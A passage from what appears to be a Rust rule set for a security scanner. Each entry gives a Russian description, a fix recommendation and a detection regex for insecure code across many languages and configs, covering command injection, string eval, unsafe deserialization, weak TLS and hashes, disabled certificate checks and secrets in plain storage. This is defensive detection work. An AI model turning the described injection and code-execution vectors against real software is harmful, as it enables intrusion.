        references: &["https://cwe.mitre.org/data/definitions/1104.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-SW-002",
        title: "Инъекция JavaScript во webview",
        description: "stringByEvaluatingJavaScriptFromString и evaluateJavaScript с интерполяцией вставляют данные прямо в исполняемый JS. Пользовательский ввод здесь даёт инъекцию скрипта.",
        recommendation: "Не собирайте JS из строк. Передавайте данные через WKScriptMessageHandler или postMessage, экранируя значения.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "XSS",
        languages: &[Language::Swift],
        pattern: r#"stringByEvaluatingJavaScriptFromString|evaluateJavaScript\s*\(\s*"[^"]*\\\("#,
        unless_contains: &[],
        cwe: &["CWE-79"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/79.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-SW-003",
        title: "Слабый хеш (MD5/SHA-1)",
        description: "MD5 и SHA-1 подвержены коллизиям и не годятся для подписей и проверки целостности.",
        recommendation: "Используйте SHA-256 (CryptoKit: SHA256). Для паролей — bcrypt или Argon2 через проверенную библиотеку.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Криптография",
        languages: &[Language::Swift],
        pattern: r"\bCC_MD5\b|\bCC_SHA1\b|Insecure\.(?:MD5|SHA1)\b",
        unless_contains: &[],
        cwe: &["CWE-327", "CWE-328"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/327.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-SW-004",
        title: "Секрет в UserDefaults",
        description: "UserDefaults хранит данные в незашифрованном plist. Пароль, токен или ключ там доступен любому, кто получит устройство или бэкап.",
        recommendation: "Храните секреты в Keychain (kSecClassGenericPassword), а не в UserDefaults.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Хранение секретов",
        languages: &[Language::Swift],
        pattern: r#"(?i)UserDefaults[^\n]*\.set\s*\([^\n)]*forKey:\s*"[^"]*(?:password|token|secret|apikey|api_key|credential)"#,
        unless_contains: &[],
        cwe: &["CWE-312"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/312.html"],
        skip_in_tests: false,
    },

    // ----------------------------------------------------------------- Scala
    Rule {
        id: "VS-SC-001",
        title: "SQL-запрос собирается s-интерполяцией",
        description: "Интерполятор s\"...$x...\" просто вставляет значение в строку, не экранируя его. Переданный так в запрос пользовательский ввод меняет структуру SQL.",
        recommendation: "Используйте параметризованные запросы фреймворка: интерполятор sql\"...\" в Slick/Doobie/Anorm подставляет значения как параметры.",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "SQL-инъекция",
        languages: &[Language::Scala],
        pattern: r#"(?i)s"[^"]*(?:select |insert |update |delete )[^"]*\$"#,
        unless_contains: &[],
        cwe: &["CWE-89"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/89.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-SC-002",
        title: "Слабый хеш (MD5/SHA-1)",
        description: "MD5 и SHA-1 подвержены коллизиям, их нельзя применять для подписей и проверки целостности.",
        recommendation: "Берите MessageDigest.getInstance(\"SHA-256\"). Для паролей — BCrypt или Argon2.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Криптография",
        languages: &[Language::Scala],
        pattern: r#"MessageDigest\.getInstance\s*\(\s*["'](?:MD5|SHA-?1)["']"#,
        unless_contains: &[],
        cwe: &["CWE-327", "CWE-328"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/327.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-SC-003",
        title: "Десериализация через ObjectInputStream",
        description: "readObject() восстанавливает произвольные классы и вызывает их методы. На недоверенных данных это классический вектор RCE в Java.",
        recommendation: "Не десериализуйте недоверенные данные. Используйте JSON с явной схемой или ObjectInputFilter с белым списком классов.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Небезопасная десериализация",
        languages: &[Language::Scala],
        pattern: r"new\s+ObjectInputStream\s*\(|\.readObject\s*\(\s*\)",
        unless_contains: &["ObjectInputFilter", "setObjectInputFilter"],
        cwe: &["CWE-502"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://cwe.mitre.org/data/definitions/502.html"],
        skip_in_tests: false,
    },

    // ------------------------------------------------------------------ Perl
    Rule {
        id: "VS-PL-001",
        title: "Команда с интерполяцией в шелл",
        description: "Обратные кавычки, system и qx выполняют строку через шелл. Интерполяция переменной в неё даёт инъекцию команд.",
        recommendation: "Вызывайте system списком аргументов: system(\"git\", \"log\", $branch) — тогда шелл не участвует.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Инъекция команд",
        languages: &[Language::Perl],
        pattern: r#"`[^`]*\$[\w{]|\b(?:system|exec)\s*\(?\s*["'][^"']*\$|\bqx[\(\{/\[]"#,
        unless_contains: &[],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PL-002",
        title: "Двухаргументный open с переменной",
        description: "open(FH, $path) в двухаргументной форме трактует спецсимволы в $path: ведущий или замыкающий | запускает команду, а > < меняют режим. Это инъекция команд и обход доступа.",
        recommendation: "Используйте трёхаргументный open с явным режимом: open(my $fh, \"<\", $path).",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Инъекция команд",
        languages: &[Language::Perl],
        pattern: r"\bopen\s*\(\s*\*?\w+\s*,\s*\$\w+\s*\)",
        unless_contains: &[],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PL-003",
        title: "Строковый eval (выполнение кода)",
        description: "eval со строкой (eval \"...\" или eval $code) компилирует и исполняет её как Perl. Ввод в этой строке даёт выполнение произвольного кода. Блочный eval { ... } для перехвата ошибок безопасен и не подпадает.",
        recommendation: "Для обработки ошибок используйте блочный eval { ... } или Try::Tiny. Не исполняйте пользовательский ввод как код.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Выполнение кода",
        languages: &[Language::Perl],
        pattern: r#"\beval\s*["']|\beval\s+\$\w"#,
        unless_contains: &[],
        cwe: &["CWE-95"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/95.html"],
        skip_in_tests: false,
    },

    // ------------------------------------------------------------------- Lua
    Rule {
        id: "VS-LU-001",
        title: "Команда через os.execute / io.popen",
        description: "os.execute и io.popen запускают строку через шелл. Склейка пользовательских данных в неё приводит к инъекции команд.",
        recommendation: "Избегайте os.execute с собранной строкой. Проверяйте ввод по белому списку и не передавайте его в шелл.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Инъекция команд",
        languages: &[Language::Lua],
        pattern: r"\bos\.execute\s*\(|\bio\.popen\s*\(",
        unless_contains: &[],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-LU-002",
        title: "Динамический код через load / loadstring",
        description: "load и loadstring компилируют строку в функцию. Если в строку попадают внешние данные, это выполнение произвольного кода.",
        recommendation: "Не компилируйте код из данных. Для конфигурации используйте разбор JSON, для поведения — таблицу-диспетчер.",
        severity: Severity::High,
        confidence: Confidence::Low,
        category: "Выполнение кода",
        languages: &[Language::Lua],
        pattern: r"\bloadstring\s*\(|\bload\s*\(",
        unless_contains: &[],
        cwe: &["CWE-95"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/95.html"],
        skip_in_tests: true,
    },

    // ---------------------------------------------------------------- Elixir
    Rule {
        id: "VS-EX-001",
        title: "Команда через шелл (:os.cmd / System.shell)",
        description: ":os.cmd и System.shell выполняют строку через системный шелл, интерпретируя метасимволы. Пользовательский ввод в ней даёт инъекцию команд.",
        recommendation: "Используйте System.cmd(\"git\", [\"log\", branch]) со списком аргументов — он не запускает шелл.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Инъекция команд",
        languages: &[Language::Elixir],
        pattern: r":os\.cmd\s*\(|System\.shell\s*\(",
        unless_contains: &[],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-EX-002",
        title: "Выполнение кода через Code.eval_string",
        description: "Code.eval_string и Code.eval_quoted компилируют и исполняют переданный код. Внешние данные в аргументе означают выполнение произвольного кода.",
        recommendation: "Не выполняйте код из данных. Для динамического выбора используйте apply/3 по проверенному белому списку функций.",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "Выполнение кода",
        languages: &[Language::Elixir],
        pattern: r"Code\.eval_(?:string|quoted)\s*\(",
        unless_contains: &[],
        cwe: &["CWE-95"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/95.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-EX-003",
        title: "Небезопасная десериализация binary_to_term",
        description: ":erlang.binary_to_term без опции :safe воссоздаёт произвольные термы, включая функции и атомы, что ведёт к исчерпанию атомов и выполнению кода.",
        recommendation: "Передавайте опцию [:safe]: binary_to_term(data, [:safe]). Недоверенные данные так десериализовать нельзя вовсе.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Небезопасная десериализация",
        languages: &[Language::Elixir],
        pattern: r"binary_to_term\s*\(",
        unless_contains: &[":safe"],
        cwe: &["CWE-502"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://cwe.mitre.org/data/definitions/502.html"],
        skip_in_tests: false,
    },

    // ----------------------------------------------------------------- Nginx
    Rule {
        id: "VS-NG-001",
        title: "server_tokens включён",
        description: "server_tokens on раскрывает точную версию nginx в заголовках и на страницах ошибок, упрощая подбор известных эксплойтов под неё.",
        recommendation: "Задайте server_tokens off в блоке http.",
        severity: Severity::Low,
        confidence: Confidence::High,
        category: "Утечка данных",
        languages: &[Language::Nginx],
        pattern: r"(?mi)^\s*server_tokens\s+on\b",
        unless_contains: &[],
        cwe: &["CWE-200"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/200.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-NG-002",
        title: "Устаревшие протоколы TLS",
        description: "SSLv3 и TLS 1.0/1.1 содержат известные уязвимости (POODLE, BEAST) и выведены из эксплуатации.",
        recommendation: "Оставьте только современные версии: ssl_protocols TLSv1.2 TLSv1.3;",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: &[Language::Nginx],
        pattern: r"(?mi)^\s*ssl_protocols\s+[^;]*(?:SSLv2|SSLv3|TLSv1\.1|TLSv1[\s;])",
        unless_contains: &[],
        cwe: &["CWE-326"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/326.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-NG-003",
        title: "Слабые TLS-шифры",
        description: "Наборы с NULL, RC4, DES, MD5, EXPORT или aNULL не обеспечивают конфиденциальности и целостности соединения.",
        recommendation: "Ограничьте ssl_ciphers современными AEAD-наборами и включите ssl_prefer_server_ciphers on.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Криптография",
        languages: &[Language::Nginx],
        pattern: r"(?mi)^\s*ssl_ciphers\s+[^;]*(?:NULL|RC4|3?DES|MD5|EXPORT|aNULL|eNULL)",
        unless_contains: &[],
        cwe: &["CWE-327"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/327.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-NG-004",
        title: "Включён листинг каталога (autoindex)",
        description: "autoindex on отдаёт список файлов каталога без index-файла, раскрывая структуру и файлы, которые не предназначались для публикации.",
        recommendation: "Уберите autoindex on там, где листинг не нужен намеренно.",
        severity: Severity::Low,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Nginx],
        pattern: r"(?mi)^\s*autoindex\s+on\b",
        unless_contains: &[],
        cwe: &["CWE-548"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/548.html"],
        skip_in_tests: false,
    },

    // ------------------------------------------------------------ Vue / Svelte
    Rule {
        id: "VS-VU-001",
        title: "Vue: v-html вставляет сырой HTML",
        description: "Директива v-html рендерит значение как HTML без экранирования. Пользовательские данные в ней приводят к XSS.",
        recommendation: "Выводите данные через {{ }} — Vue их экранирует. Для доверенной разметки очищайте её DOMPurify перед вставкой.",
        severity: Severity::Medium,
        confidence: Confidence::Low,
        category: "XSS",
        languages: &[Language::Vue],
        pattern: r"\bv-html\b",
        unless_contains: &[],
        cwe: &["CWE-79"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/79.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-SV-001",
        title: "Svelte: {@html} вставляет сырой HTML",
        description: "Блок {@html expr} рендерит значение как HTML без экранирования. Пользовательские данные в нём приводят к XSS.",
        recommendation: "Выводите данные обычной интерполяцией {expr} — Svelte их экранирует. Для доверенной разметки очищайте её DOMPurify.",
        severity: Severity::Medium,
        confidence: Confidence::Low,
        category: "XSS",
        languages: &[Language::Svelte],
        pattern: r"\{@html\b",
        unless_contains: &[],
        cwe: &["CWE-79"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/79.html"],
        skip_in_tests: true,
    },

    // ---------------------------------- IaC/CI/Docker/nginx: конфигурация
    Rule {
        id: "VS-DK-007",
        title: "Контейнер работает от root (USER root)",
        description: "Явный USER root оставляет процесс с правами суперпользователя внутри контейнера. Любая уязвимость в приложении сразу даёт root, что упрощает побег.",
        recommendation: "Создайте непривилегированного пользователя и переключитесь на него: RUN adduser app && USER app.",
        severity: Severity::Low,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Dockerfile],
        pattern: r"(?mi)^\s*USER\s+root\b",
        unless_contains: &[],
        cwe: &["CWE-250"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://docs.docker.com/develop/develop-images/dockerfile_best-practices/"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-DK-008",
        title: "sudo внутри RUN",
        description: "sudo в Dockerfile не нужен (сборка и так идёт от root) и приносит setuid-бинарник с известными способами эскалации в итоговый образ.",
        recommendation: "Уберите sudo. Если нужно понизить привилегии — используйте инструкцию USER или gosu.",
        severity: Severity::Low,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: &[Language::Dockerfile],
        pattern: r"(?mi)^\s*RUN\b[^\n]*\bsudo\b",
        unless_contains: &[],
        cwe: &["CWE-250"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://docs.docker.com/develop/develop-images/dockerfile_best-practices/"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-DK-009",
        title: "Установка пакетов Python из HTTP-источника",
        description: "--index-url http:// или --trusted-host отключает проверку источника пакетов pip. Пакет можно подменить по пути (man-in-the-middle) — прямой путь к цепочке поставок.",
        recommendation: "Ставьте пакеты только по HTTPS с проверкой хеша; не используйте --trusted-host в продакшене.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Цепочка поставок",
        languages: &[Language::Dockerfile],
        pattern: r"--trusted-host\b|--(?:extra-)?index-url[=\s]+http://",
        unless_contains: &[],
        cwe: &["CWE-494"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://cwe.mitre.org/data/definitions/494.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-DK-010",
        title: "Установка пакетов без проверки подписи (apt)",
        description: "--allow-unauthenticated и --force-yes отключают проверку GPG-подписи пакетов apt. Атакующий с контролем зеркала подсунет вредоносный пакет.",
        recommendation: "Не отключайте проверку подписи. Используйте официальные репозитории с корректными ключами.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Цепочка поставок",
        languages: &[Language::Dockerfile],
        pattern: r"--allow-unauthenticated|--force-yes|--allow-untrusted",
        unless_contains: &[],
        cwe: &["CWE-494"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://cwe.mitre.org/data/definitions/494.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-CI-005",
        title: "GitHub Actions: self-hosted runner",
        description: "runs-on: self-hosted на публичном репозитории опасно: чужой pull request может выполнить свой код на вашем раннере и закрепиться в вашей сети.",
        recommendation: "Для публичных репозиториев используйте одноразовые GitHub-hosted раннеры; self-hosted — только с ручным одобрением запуска.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: &[Language::Yaml],
        pattern: r#"(?mi)runs-on:\s*\[?\s*["']?self-hosted"#,
        unless_contains: &[],
        cwe: &["CWE-284"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://docs.github.com/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-CI-006",
        title: "GitHub Actions: включены небезопасные команды",
        description: "ACTIONS_ALLOW_UNSECURE_COMMANDS: true возвращает устаревшие set-env/add-path через stdout. Вывод шага, содержащий ввод, может переопределить переменные окружения и PATH.",
        recommendation: "Не включайте этот флаг. Используйте файлы окружения $GITHUB_ENV и $GITHUB_PATH.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Yaml],
        pattern: r"ACTIONS_ALLOW_UNSECURE_COMMANDS",
        unless_contains: &[],
        cwe: &["CWE-77"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://github.blog/changelog/2020-10-01-github-actions-deprecating-set-env-and-add-path-commands/"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-NG-005",
        title: "nginx: proxy_pass по переменной (SSRF)",
        description: "proxy_pass с адресом из переменной (например, из части URL или заголовка) позволяет клиенту управлять тем, куда nginx проксирует запрос. Это server-side request forgery.",
        recommendation: "Проксируйте на фиксированные upstream'ы; не собирайте адрес proxy_pass из пользовательского ввода.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: &[Language::Nginx],
        pattern: r"(?mi)proxy_pass\s+https?://\$",
        unless_contains: &[],
        cwe: &["CWE-918"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/918.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-025",
        title: "RDS: финальный снимок при удалении отключён",
        description: "skip_final_snapshot = true удаляет БД без финального бэкапа. Ошибочный или злонамеренный terraform destroy уничтожает данные безвозвратно.",
        recommendation: "Оставьте skip_final_snapshot = false и задайте final_snapshot_identifier.",
        severity: Severity::Low,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Terraform],
        pattern: r"skip_final_snapshot\s*=\s*true",
        unless_contains: &[],
        cwe: &["CWE-1188"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-026",
        title: "Защита от удаления ресурса отключена",
        description: "deletion_protection = false позволяет снести БД, кластер или LB одной командой. В связке с широкими правами это риск потери данных и простоя.",
        recommendation: "Включите deletion_protection = true для критичных ресурсов.",
        severity: Severity::Low,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: &[Language::Terraform],
        pattern: r"deletion_protection\s*=\s*false",
        unless_contains: &[],
        cwe: &["CWE-693"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://registry.terraform.io/providers/hashicorp/aws/latest/docs"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-027",
        title: "ECR: теги образов изменяемы",
        description: "image_tag_mutability = \"MUTABLE\" позволяет перезаписать тег другим образом. Ранее проверенный тег может подмениться — риск целостности и цепочки поставок.",
        recommendation: "Задайте image_tag_mutability = \"IMMUTABLE\" и ссылайтесь на образы по дайджесту.",
        severity: Severity::Low,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Terraform],
        pattern: r#"image_tag_mutability\s*=\s*"MUTABLE""#,
        unless_contains: &[],
        cwe: &["CWE-1104"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-tag-mutability.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-028",
        title: "ECR: сканирование образов при push отключено",
        description: "scan_on_push = false отключает проверку образов на известные уязвимости при загрузке. Уязвимые образы попадают в реестр незамеченными.",
        recommendation: "Включите scan_on_push = true (или Enhanced Scanning) для репозиториев ECR.",
        severity: Severity::Low,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Terraform],
        pattern: r"scan_on_push\s*=\s*false",
        unless_contains: &[],
        cwe: &["CWE-1104"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-scanning.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-AN-001",
        title: "Ansible: проверка TLS-сертификата отключена",
        description: "validate_certs: no отключает проверку сертификата в модулях uri/get_url и подобных. Соединение перестаёт защищать от подмены.",
        recommendation: "Держите validate_certs: yes и корректный набор CA.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: &[Language::Yaml],
        pattern: r"(?mi)validate_certs\s*:\s*(?:no|false)\b",
        unless_contains: &[],
        cwe: &["CWE-295"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://docs.ansible.com/ansible/latest/collections/ansible/builtin/uri_module.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-AN-002",
        title: "Проверка ключа хоста SSH отключена",
        description: "StrictHostKeyChecking=no принимает ключ хоста автоматически и открывает соединение к возможно подменённому серверу — man-in-the-middle по SSH.",
        recommendation: "Оставьте StrictHostKeyChecking=yes и заранее раздайте known_hosts.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: &[Language::Yaml, Language::Shell],
        pattern: r"StrictHostKeyChecking[=\s]+no\b",
        unless_contains: &[],
        cwe: &["CWE-295"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/295.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-AN-003",
        title: "Файл создаётся с правами 0777",
        description: "mode: '0777' даёт полный доступ на чтение, запись и исполнение всем пользователям. Любой на хосте может изменить файл или прочитать секрет.",
        recommendation: "Задайте минимально необходимые права (например, '0640' для конфигов, '0600' для секретов).",
        severity: Severity::Low,
        confidence: Confidence::Low,
        category: "Работа с файлами",
        languages: &[Language::Yaml],
        pattern: r#"(?mi)^\s*mode\s*:\s*["']?0?777\b"#,
        unless_contains: &[],
        cwe: &["CWE-732"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/732.html"],
        skip_in_tests: false,
    },

    // ------------------------- Слабый TLS/крипто и небезопасные протоколы
    Rule {
        id: "VS-PY-037",
        title: "Явно выбран устаревший протокол TLS/SSL",
        description: "ssl.PROTOCOL_SSLv23/SSLv3/TLSv1 фиксирует давно скомпрометированную версию (POODLE, BEAST). Соединение можно понизить до уязвимого протокола.",
        recommendation: "Используйте ssl.PROTOCOL_TLS_CLIENT/SERVER и minimum_version = TLSVersion.TLSv1_2.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: PY,
        pattern: r"ssl\.PROTOCOL_(?:SSLv23|SSLv2|SSLv3|TLSv1)\b",
        unless_contains: &[],
        cwe: &["CWE-326"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://docs.python.org/3/library/ssl.html#ssl.PROTOCOL_TLS_CLIENT"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-038",
        title: "Слабый шифр (DES/RC4/Blowfish)",
        description: "DES, 3DES, RC4 и Blowfish считаются сломанными: короткий блок/ключ и практические атаки. Данные под ними защищены слабо.",
        recommendation: "Используйте AES-GCM (Crypto.Cipher.AES с MODE_GCM) или ChaCha20-Poly1305.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Криптография",
        languages: PY,
        pattern: r"\b(?:DES|DES3|ARC4|ARC2|Blowfish)\.new\s*\(",
        unless_contains: &[],
        cwe: &["CWE-327"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/327.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-039",
        title: "Использование telnet (незашифрованный протокол)",
        description: "telnetlib открывает соединение по Telnet — без шифрования. Логин, пароль и данные передаются открытым текстом и перехватываются в сети.",
        recommendation: "Используйте SSH (paramiko) вместо Telnet.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: PY,
        pattern: r"\btelnetlib\b",
        unless_contains: &[],
        cwe: &["CWE-319"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/319.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-035",
        title: "Открытый редирект: redirect по данным запроса",
        description: "res.redirect() с данными из req (query/params/body) отправляет пользователя по адресу, который задаёт он сам. Атакующий уводит жертву на фишинговый сайт с доверенного домена.",
        recommendation: "Редиректьте только по белому списку или относительным путям; проверяйте, что цель принадлежит вашему домену.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Открытый редирект",
        languages: JS_FAMILY,
        pattern: r"res\.redirect\s*\(\s*(?:req\.|request\.)",
        unless_contains: &[],
        cwe: &["CWE-601"],
        owasp: Some(OWASP_ACCESS),
        references: &["https://cwe.mitre.org/data/definitions/601.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-036",
        title: "Явно выбран устаревший протокол TLS",
        description: "secureProtocol: 'SSLv3_method'/'TLSv1_method' привязывает соединение к сломанной версии протокола. Это открывает атаки понижения и известные уязвимости.",
        recommendation: "Не задавайте secureProtocol вручную; при необходимости используйте minVersion: 'TLSv1.2'.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: JS_FAMILY,
        pattern: r#"secureProtocol\s*:\s*["'](?:SSLv3|SSLv2|TLSv1)_method"#,
        unless_contains: &[],
        cwe: &["CWE-326"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://nodejs.org/api/tls.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-030",
        title: "Слабый протокол в SSLContext",
        description: "SSLContext.getInstance(\"SSL\"/\"SSLv3\"/\"TLSv1\") создаёт контекст со сломанным протоколом. Соединение уязвимо к POODLE/BEAST и понижению версии.",
        recommendation: "Запрашивайте SSLContext.getInstance(\"TLSv1.2\") или \"TLS\" и ограничивайте минимальную версию.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r#"SSLContext\.getInstance\s*\(\s*"(?:SSL|SSLv3|SSLv2|TLSv1)""#,
        unless_contains: &[],
        cwe: &["CWE-326"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/326.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-CS-014",
        title: "Слабый шифр (DES/RC2/3DES)",
        description: "DESCryptoServiceProvider, RC2 и TripleDES используют сломанные или устаревшие алгоритмы с коротким ключом/блоком. Шифрование ими ненадёжно.",
        recommendation: "Используйте AES (Aes.Create) в режиме GCM или CBC со случайным IV.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Криптография",
        languages: &[Language::CSharp],
        pattern: r"(?:DES|RC2|TripleDES)CryptoServiceProvider",
        unless_contains: &[],
        cwe: &["CWE-327"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/327.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PH-017",
        title: "cURL: проверка TLS-сертификата отключена",
        description: "CURLOPT_SSL_VERIFYPEER = false или CURLOPT_SSL_VERIFYHOST = 0 отключает проверку сертификата сервера. Соединение больше не защищено от man-in-the-middle.",
        recommendation: "Держите CURLOPT_SSL_VERIFYPEER = true и CURLOPT_SSL_VERIFYHOST = 2; при необходимости укажите CURLOPT_CAINFO.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: &[Language::Php],
        pattern: r"CURLOPT_SSL_VERIFY(?:PEER\s*,\s*(?:false|0)|HOST\s*,\s*0)\b",
        unless_contains: &[],
        cwe: &["CWE-295"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/295.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-RB-013",
        title: "Проверка TLS-сертификата отключена (VERIFY_NONE)",
        description: "verify_mode = OpenSSL::SSL::VERIFY_NONE заставляет клиент принимать любой сертификат. HTTPS-соединение перестаёт защищать от подмены.",
        recommendation: "Используйте VERIFY_PEER и корректный набор корневых сертификатов.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: &[Language::Ruby],
        pattern: r"OpenSSL::SSL::VERIFY_NONE",
        unless_contains: &[],
        cwe: &["CWE-295"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/295.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-RB-014",
        title: "Kernel#open с пайпом или пользовательскими данными",
